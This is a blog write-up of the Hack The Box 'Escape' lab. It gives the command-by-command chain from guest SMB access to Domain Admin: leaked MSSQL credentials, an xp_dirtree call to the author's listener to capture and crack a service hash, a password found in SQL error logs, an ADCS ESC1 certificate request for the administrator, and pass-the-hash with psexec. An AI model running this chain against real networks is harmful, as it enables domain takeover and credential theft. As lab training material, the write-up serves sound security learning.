# 🏗️ PROTOCOL BREACH: Engineering Total Domain Compromise on HTB Escape

How a simple MSSQL log leak became a roadmap to SYSTEM. Mastering the art of the ADCS ESC1 certificate takeover. 💻👑

---

### Escaping the Domain: From MSSQL Guest to ADCS Domain Admin (ESC1 Exploitation)

**Target:** *Escape (10.10.11.202)* **OS:** *Windows* **Difficulty:** *Medium* **Attack Vectors:** *SMB Enumeration -\> MSSQL Lateral Movement -\> ADCS Misconfiguration (ESC1) -\> Domain Admin*.

![](https://cdn-images-1.medium.com/max/800/1*uBb0RqbGXNA8yokYhglu-w.png)

> <a href="https://medium.com/bugbountywriteup/%EF%B8%8F-protocol-breach-engineering-total-domain-compromise-on-htb-escape-350ecacf457c?sk=756d32a12d9ba0ae214346d3559b8bd3" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/bugbountywriteup/%EF%B8%8F-protocol-breach-engineering-total-domain-compromise-on-htb-escape-350ecacf457c?sk=756d32a12d9ba0ae214346d3559b8bd3" target="_blank">**Not a Member?? Click Here to read Full-Story**</a>

### Executive Summary

**Assessment Date:** *January 11, 2026* **Risk Level:** *CRITICAL* **Author:** *R00t3dbyFa17h/Nicholas Mullenski*

#### Overview

The “Escape” engagement highlighted critical vulnerabilities within the organization’s Active Directory Certificate Services (ADCS) infrastructure. The target environment exposed sensitive information via SMB shares, allowing for initial access to the MSSQL database. Poor log management practices within the database facilitated lateral movement to a domain user.

#### Key Findings

Information Disclosure: An unsecured SMB share contained internal documentation revealing credentials for the SQL Service account.

Weak Log Management: The MSSQL logs contained cleartext credentials for a domain user (Ryan.Cooper) due to a failed login attempt where the password was inadvertently entered as the username.

ADCS Misconfiguration (ESC1): The Certificate Authority (CA) was configured with a vulnerable certificate template allowing low-privileged users to request certificates for any user, including the Administrator, leading to immediate domain compromise.

#### Strategic Recommendation

Organizations must strictly restrict SMB share permissions and regularly audit file contents for sensitive data. Database logs should be sanitized to prevent credential leakage. Most importantly, Certificate Templates within ADCS must be hardened to prevent “Enrollee Supplies Subject” flags on templates that allow client authentication.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan

- <span id="a2d5">We began the engagement with a comprehensive port scan to identify the attack surface.</span>

**Command:**

```

 ┌──(achilles㉿Nicholas)-[~/HTB/Labs/Escape]
└─$ sudo nmap -sC -sV -vvv -A -oA nmap/escape 10.10.11.202
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds  Windows Server 2019 Standard 17763
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=sequel-DC-CA
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb
```

#### **1.1.2 Analysis**

The scan reveals a rich attack surface typical of a Domain Controller.

- <span id="f530">**Domain:** **`sequel.htb`** (We must add **`10.10.11.202 sequel.htb`** to our `/`**`etc/hosts`** file).</span>
- <span id="a7dc">**SQL Server (1433):** The presence of MSSQL is the most notable outlier for a standard DC, making it a primary target for enumeration.</span>
- <span id="91d1">**ADCS:** The **LDAP SSL** certificate issuer is listed as **`sequel-DC-CA`**, confirming that Active Directory Certificate Services are running, which opens up vectors like **ESC1** or **ESC8**.</span>

#### 1.2 SMB Enumeration

#### 1.2.1 Share Discovery

- <span id="fa8e">Since port 445 was open, the next logical step was to check for accessible file shares. We utilized netexec to enumerate shares available to the guest or anonymous user.</span>

**Command:**

```
┌──(achilles㉿Nicholas)-[~/HTB/Labs/Escape]
└─$ netexec smb 10.10.11.202 -u 'guest' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\guest:
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share
SMB         10.10.11.202    445    DC               Public          READ
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```

#### **1.2.2 Information Leakage**

- <span id="b2f1">The Public share permission was set to READ. We connected using smbclient to inspect the contents.</span>

**Command:**

```
smbclient //10.10.11.202/Public -U '%'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

  5184255 blocks of size 4096. 1465862 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (78.7 KiloBytes/sec) (average 78.7 KiloBytes/sec)
smb: \>
```

#### 1.2.3 Findings:

- <span id="4f94">We downloaded the SQL Server Procedures.pdf. Upon analysis, the document contained a sensitive note regarding the configuration of the sql_svc account:</span>
- <span id="1cd4">**User:** **`PublicUser`**</span>
- <span id="aa1c">**Password:** **`GuestUserCantWrite1`**</span>

### 2.0 Lateral Movement (MSSQL)

#### 2.1 Credential Verification

Before attempting to interact with the database, we verified the credentials using `netexec`. Standard domain authentication failed because the `PublicUser` account is restricted from the domain. We successfully verified access by forcing **Local Authentication** against the SQL Server itself.

**Command:**

```
netexec mssql 10.10.11.202 -u PublicUser -p 'GuestUserCantWrite1' --local-auth
MSSQL       10.10.11.202    1433   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
MSSQL       10.10.11.202    1433   DC               [+] DC\PublicUser:GuestUserCantWrite1
```

#### 2.1.1 Service Authentication

With the valid credentials verified locally, we authenticated to the Microsoft SQL Server running on port 1433 using **`impacket-mssqlclient`**.

**Command:**

```
impacket-mssqlclient 'PublicUser:GuestUserCantWrite1@10.10.11.202'
```

#### 2.1.2 Privilege Escalation Vector (xp_dirtree)

Once authenticated as the low-privileged **`PublicUser`**, we targeted the SQL Service account (**`sql_svc`**) to elevate privileges. We initiated a **Responder** listener on our attack interface (**`tun0`**) and executed the **`xp_dirtree`** stored procedure. This forced the SQL Server service to connect back to our machine, exposing its NTLMv2 hash.

**SQL Command:**

```
EXEC master..xp_dirtree '\\10.10.14.32\share';
```

#### 2.1.3 Hash Cracking

Responder successfully captured the hash for `sql_svc`. We utilized **Hashcat** with the `OneRuleToRuleThemAll` rule set to crack the complex password, as standard dictionary attacks failed.

![](https://cdn-images-1.medium.com/max/800/1*MD9WnbmB7uRmuaM2EGNz-Q.png)

**Command:**

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r OneRuleToRuleThemAll.rule
```

**Recovered Credentials:**

- <span id="3f12">**User:** sql_svc</span>
- <span id="22cc">**Password:** REGGIE1234ronnie</span>

#### 2.1.4 SMB Enumeration & Second Pivot

With the **`sql_svc`** credentials, we transitioned from the database layer to the network layer. Using **`netexec`**, we identified a **`Public`** share on the Domain Controller.

**Command:**

```
netexec smb 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie' --shares
```

### 2.1.6 Ryan Cooper Password Discovery

To find the password for **`Ryan.Cooper`**, we returned to the MSSQL Error Logs. We discovered that a user had accidentally attempted to log in by typing their password into the **username** field, which was then logged in cleartext by the system.

**Command:**

```
EXEC xp_readerrorlog;
```

- <span id="18a5">**Identified Password:** **`NuclearMosquito3`**</span>
- <span id="3da1">**Validation:** We successfully verified this password against the **`Ryan.Cooper`** account.</span>

### 2.1.7 Privilege Escalation (ADCS ESC1)

With Ryan Cooper’s credentials, we enumerated the Certificate Services. We found that the **`UserAuthentication`** template allowed users to supply a **Subject Alternative Name (SAN)**, making it vulnerable to **ESC1**. We requested a certificate for the **`administrator`** user.

**Command:**

```
certipy-ad req -u 'Ryan.Cooper' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb
```

### 2.1.8 Persistence and Clock Skew Mitigation

When attempting to authenticate with the **`administrator.pfx`** certificate, the system returned a **`KRB_AP_ERR_SKEW`** error. Investigation revealed an 8-hour time difference between the attack machine and the Domain Controller. We utilized the **`faketime`** utility to wrap the authentication process and bypass the Kerberos time-sensitivity requirement.

**Command:**

```
faketime -f "+8hours" certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.202
```

- <span id="9f4b">**Result:** Successfully retrieved the NT hash for the Domain Administrator.</span>
- <span id="6dad">**Admin Hash:** **`a52f78e4c751e5f5e17e1e9XXXXXXX`**</span>

### 2.1.9 Final Domain Compromise (Root)

With the Domain Administrator’s hash, we performed a Pass-the-Hash (PtH) attack using **`impacket-psexec`** to gain a SYSTEM shell on the Domain Controller.

**Command:**

```
impacket-psexec -hashes :a52f78e4c751e5f5e17e1e9f3XXXXX administrator@10.10.11.202
```

### 2.1.10 Flag Recovery

Upon gaining SYSTEM access, we navigated to the respective user desktops to retrieve the flags.

- <span id="eac9">**User Flag:** **`type C:\Users\Ryan.Cooper\Desktop\user.txt`**</span>
- <span id="faad">**Root Flag:** **`type C:\Users\Administrator\Desktop\root.txt`**</span>

![](https://cdn-images-1.medium.com/max/800/1*hjAEnHsPIkcA5VI_DfrcZQ.png)

### Conclusion and Red Team Mandate

The compromise of the **Escape** environment demonstrates the critical danger of information disclosure in system logs and the catastrophic impact of misconfigured Active Directory Certificate Services (ADCS). By chain-linking a simple log leak to an ESC1 certificate vulnerability, we transitioned from a database guest to full Domain Administrator.

**The Mission:** To secure the digital sheepfold by identifying the wolves of misconfiguration before they can strike. We do not just break systems; we reveal the truth so they can be rebuilt stronger.

---

### R00t3d In Fa17h: The Word & The Tool

> ***Luke 12:2 (NIV)*** “There is nothing concealed that will not be disclosed, or hidden that will not be made known.”

**The Tie-In:** In this lab, the “concealed” truth was Ryan Cooper’s password, hidden not in a secure vault, but in the public-facing error logs of a SQL server. The “hidden” vulnerability was a certificate template that allowed any user to claim they were the Administrator.

Just as the Word of God promises that every secret will eventually come to light, the tools of a penetration tester — like **`xp_readerrorlog`** and **`Certipy`**—act as the light that brings these technical "sins" into the open. We "root" ourselves in the faith that the truth is always findable if we have the patience to seek it. When we uncover these vulnerabilities, we fulfill our mandate to bring hidden dangers into the light so that the environment can be made secure.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

- <span id="d58e">Is there a specific tool you wish existed?</span>
- <span id="4c53">Is there a hacking concept you want me to learn and explain?</span>
- <span id="d6f5">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/T2rjP8JyNd" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/T2rjP8JyNd" title="https://discord.gg/T2rjP8JyNd"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/T2rjP8JyNd" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="0b09ddb94d53c1efd4ddba1fc01812dc"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 12, 2026](https://medium.com/p/350ecacf457c).

<a href="https://medium.com/@nicholasmullenski/%EF%B8%8F-protocol-breach-engineering-total-domain-compromise-on-htb-escape-350ecacf457c" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
